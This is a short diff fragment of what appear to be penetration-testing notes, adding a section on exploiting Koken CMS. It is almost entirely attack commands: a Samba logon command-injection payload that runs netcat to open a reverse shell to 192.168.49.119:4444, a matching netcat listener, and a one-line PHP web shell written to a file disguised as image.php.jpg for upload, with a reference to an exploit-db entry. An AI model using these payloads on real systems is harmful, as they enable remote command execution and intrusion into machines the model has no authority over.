@@ -76,3 +76,10 @@ smb reverseshell
 logon “/=`nc 192.168.49.119 4444 -e /bin/bash`"
 nc -vvlp 4444
 ```
+
+
+Exploiting koken
+```
+https://www.exploit-db.com/exploits/48706
+echo "<?php system(\$_GET['cmd']);?>" > image.php.jpg
+```
